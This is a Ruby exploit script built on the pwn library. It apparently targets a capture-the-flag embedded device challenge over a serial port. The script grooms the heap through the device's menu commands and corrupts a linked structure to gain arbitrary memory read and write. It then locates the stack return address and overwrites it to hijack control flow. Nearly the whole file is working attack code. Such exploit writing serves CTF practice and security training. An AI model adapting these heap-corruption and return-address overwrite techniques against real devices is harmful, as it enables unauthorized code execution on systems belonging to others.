#!/usr/local/bin/rescue
# encoding: ASCII-8BIT

require 'pwn'

def wswap(number)
	return (number%256).chr + (number/256).chr
end
def char(number)
	buf = []
	while number!=0 do
		buf << number%256
		number /= 256
	end
	return buf.reverse.map{|x| x.chr}.join
end

if not defined? Payload then
	$exploited = false

	# XXX bad math: there should be a 2 in the first line, I don't know why not...
	# it might because there's a 2+ in the overlap value below...
	Device1size = (2+11 + 2+2+1 + 1) # 1 is null terminator, plus padding
	Device3size = (2+11 + 2+2+1 + 2+10+1)
	Device4size = (2+11 + 2+2+1 + 2+2+1)

	# We need a space exactly large enough for device 3 + device 4 - overlap
	Padding = 'p'*(Device3size + Device4size - Device1size - (2+11))

	# Designed to be easy to recognize, we'll use it when hunting for the stack
	Stripes = ('a'..'z').map{|x| ('0'..'9').map{|y| [x,y] } }.join[0,199]

	Hax = [
		0x04.chr,      # id, needs to stay the same so we can find
		wswap(0x3231), # nameLen, not important right now
		wswap(0x3432), # keyLen, not important right now
		wswap(0x2040), # "Your flag: "
		wswap(0x2030), # "why you pivot?\n"
	].join

	Payload = [
		# heap grooming
		[2,    'k0', 'b0'],     # create device 0
		[2,    'k1', Padding],  # create device 1
		[2,    'k2', Stripes],  # create device 2
		[4, 2, 'm2', 'short'],  # shorten device 2 for better printing

		# creating vulnerable structure
		[3, 1],                 # delete device 1
		[2,    'k3', 'x'*10],   # create device 3, inverted, in slot
		[4, 0, 'm0', 'hax'+Device4size.chr], # haxs extend free space by 13
		[2,    'k4', 'b4'],     # create device 4, inverted, in slot
		[4, 3, 'm3', Hax],      # delivery, device 3's key is device 4's Link, modify it
	]

end

def flush()
	printed = ''
	loop do
		buf = $serial.recvn 120, timeout:1
		if buf =~ /Choose one/ then
			parts = buf.split 'Choose one' # HACK
			raise if parts.length != 2
			print parts.first
			printed += parts.first
			$serial.unrecv 'Choose one' + parts.last
			break
		elsif buf.empty?
			break
		else
			print buf
			printed += buf
		end
	end
	return printed
end

def waitForPrompt(prompt)
	buffer = ''
	loop do
		char = $serial.recvn 1, timeout:1
		buffer += char
		print char
		sleep 0.5 if char.empty?
		break if buffer =~ prompt
	end
end

def serialSend(output)
	line = output.to_s + "\n"
	line = output if output =~ /hax/ # hack
	raise if line.include? "\0"
	$serial.send line
	flush()
end

def sendCommand(command)
	puts "Sending #{command.join('-')}"
	serialSend command.first
	command[1..-1].each do |item|
		waitForPrompt /: /
		serialSend item
	end
end

def readRAM(offset1, offset2)
	hack = [
		0x04.chr,      # id, needs to stay the same so we can find
		wswap(0x3231), # nameLen, not important right now
		wswap(0x3432), # keyLen, not important right now
		wswap(offset1), # gather 1
		wswap(offset2), # gather 2
	].join
	waitForPrompt /5. Exit\n/
	sendCommand [4, 3, 'r3', hack]

	waitForPrompt /5. Exit\n/
	$serial.send "1\n"
	response = flush().split('Choose one').first # try to handle sillies

	match = /4. name: (.*), key: (.*)/m.match(response)
	if match then
		return [match[1], match[2].chomp]
	end
	match = /4. name: (.*)/m.match(response)
	if match then
		return [match[1], nil]
	end

	return [nil, nil]
end

def writeRAM(offset1, data1, offset2, data2)
	hack = [
		0x04.chr,              # id, needs to stay the same so we can find
		wswap(data1.length-1), # we don't want to null-terminate, so need to overflow
		wswap(data2.length-1), #
		wswap(offset1),        # offsets
		wswap(offset2),        #
	].join

	cmds = [ hack.gsub(/\0/, '_') ]
	swp = ''
	hack.split("\0").map { |x|
		swp += '_' unless swp.empty?
		swp += x
	}.reverse[1..-1].each { |partial|
		cmds << partial
	}

	cmds.each do |cmd|
		waitForPrompt /5. Exit\n/
		sendCommand [4, 3, 'w3', cmd]
		sleep 1
	end

	# actually do the send manually, because of newline issues
	execute = [4, 4, data1, data2]
	waitForPrompt /5. Exit\n/
	puts "\nEXECUTING:\n#{execute.join('-')}\n"

	serialSend execute[0] # modify
	waitForPrompt /: /
	serialSend execute[1] # device id
	waitForPrompt /: /
	$serial.send execute[2] # data1
	waitForPrompt /: /
	$serial.send execute[3] # data 2

end

begin
	if ARGV.length < 1 then
		puts "Usage: #{$0} <port>"
		exit(1)
	end

	if not $exploited then
		$serial = Pwnlib::Tubes::SerialTube.new ARGV[0], 115_200, false
		puts "ready and waiting..."
		Payload.each do |cmd|
			waitForPrompt /5. Exit\n/
			sendCommand cmd

			# debugging
			waitForPrompt /5. Exit\n/
			puts
			sendCommand [1]
			puts "continue? "
			#raise if STDIN::gets.chomp == "no"
			sleep 1
			puts; puts
		end
		$exploited = true
	end

	# find return address
	stackSkip = readRAM 0x2192, 0x2193
	returnAddress = (stackSkip[1].ord << 8) + stackSkip[0].ord - 5 - 10 - 2 # 5 is $pc+$sp, 10 is modify's frame, 2 is to get start of ret
	writeRAM 0x2000, wswap(0xF00D)+wswap(0xBAAD), returnAddress, char(0x0182)
	sleep 1
	puts $serial.read

	raise
end

